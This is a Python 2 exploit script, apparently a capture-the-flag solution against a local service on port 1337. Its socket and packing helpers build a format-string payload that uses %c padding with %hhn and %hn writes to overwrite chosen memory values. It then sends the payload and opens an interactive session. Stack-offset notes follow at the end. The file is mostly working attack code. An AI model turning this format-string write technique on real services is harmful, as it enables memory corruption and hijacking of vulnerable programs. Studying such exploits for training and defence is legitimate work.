#!/usr/bin/python
import sys
import socket
import telnetlib 
import os
import time
from struct import pack, unpack

def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        print "-=(warning)=- recvuntil() failed at recv"
        print "Last received data:"
        print d
        return False
    except socket.error as msg:
      print "-=(warning)=- recvuntil() failed:", msg
      print "Last received data:"
      print d      
      return False
    d += dnow
  return d

def recvall(sock, n):
  d = ""
  while len(d) != n:
    try:
      dnow = sock.recv(n - len(d))
      if len(dnow) == 0:
        print "-=(warning)=- recvuntil() failed at recv"
        print "Last received data:"
        print d        
        return False
    except socket.error as msg:
      print "-=(warning)=- recvuntil() failed:", msg
      print "Last received data:"
      print d      
      return False
    d += dnow
  return d

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvall(self, n):
    return recvall(self._sock, n)

  def recvuntil(self, txt):
    return recvuntil(self._sock, txt)  

# Base for any of my ROPs.
def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def rb(v):
  return unpack("<B", v[0])[0]

def rw(v):
  return unpack("<H", v[:2])[0]

def rd(v):
  return unpack("<I", v[:4])[0]

def rq(v):
  return unpack("<Q", v[:8])[0]

def go():  
  global HOST
  global PORT
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))
  

  # Put your code here!
  buf = ""
  cnt = 0

  def counter_byte(v, cnt):
    i = 0
    while ((cnt + i) & 0xff) != v:
      i += 1
    cnt += i
    return (i, cnt)

  def counter_word(v, cnt):
    i = 0
    while ((cnt + i) & 0xffff) != v:
      i += 1
    cnt += i
    return (i, cnt)


  for i in range(27):
    cnt += 1
    buf += "%c"

  k, cnt = counter_byte(0, cnt)
  buf += "%%%ic" % k
  print hex(cnt)
  buf += "%hhn"

  for i in range(40 - 29):
    cnt += 1
    buf += "%c"

  k, cnt = counter_byte(2, cnt)
  buf += "%%%ic" % k
  print hex(cnt)
  buf += "%hhn"

  for i in range(75 - 42):
    cnt += 1
    buf += "%c"

  
  k, cnt = counter_word(0x8FF8, cnt)
  buf += "%%%ic" % k
  buf += "%hn"

  k, cnt = counter_word(0x5655, cnt)
  buf += "%%%ic" % k
  buf += "%hn"

  for i in range(27):
    buf += "%c"

  k, cnt = counter_word(0x4141, cnt)
  buf += "%%%ic" % k
  buf += "\n\n\n\n%n"


  #for i in range(1, 200):
  #  if i in []:
  #    buf += "%i: %%%i$s\n" % (i, i)
  #  else:
  #    buf += "%i: %%%i$p\n" % (i, i)
  buf = buf.ljust(5120)
  s.sendall(buf)

  # Interactive sockets.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

  # Python console.
  # Note: you might need to modify ReceiverClass if you want
  #       to parse incoming packets.
  #ReceiverClass(s).start()
  #dct = locals()
  #for k in globals().keys():
  #  if k not in dct:
  #    dct[k] = globals()[k]
  #code.InteractiveConsole(dct).interact()

  s.close()

HOST = '127.0.0.1'
PORT = 1337
go()



"""
29: 0xffffd784  --> 77
41: 0xffffd784  --> 77
42: 0xffffd78c  --> 79
"""
